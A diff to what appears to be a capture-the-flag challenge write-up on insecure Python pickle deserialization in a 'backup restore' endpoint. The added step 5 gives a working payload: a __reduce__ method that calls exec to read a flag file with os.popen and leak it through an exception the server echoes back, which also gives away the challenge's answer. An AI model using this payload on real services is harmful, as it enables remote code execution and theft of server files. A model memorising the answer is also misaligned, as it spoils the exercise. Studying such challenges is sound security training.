@@ -32,6 +32,17 @@ during deserialization via `__reduce__`, regardless of who's logged in.
 4. Command executes server-side the moment `pickle.loads()` runs — this
    happens during **deserialization itself**, before your code ever
    inspects the resulting object.
+5. For scoring, use this variant (verified working) — it raises the flag
+   file's content as an exception, which the endpoint's own error handler
+   echoes straight back to you:
+   ```python
+   class Exploit:
+       def __reduce__(self):
+           return (exec, ('import os; raise Exception(os.popen("cat /srv/flags/deserialization_flag.txt").read())',))
+
+   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+   ```
+   The response's `error` field will contain the flag.
 
 ## Hints
 - Hint 1: "What format does this 'backup restore' feature actually expect? What does that format allow?"
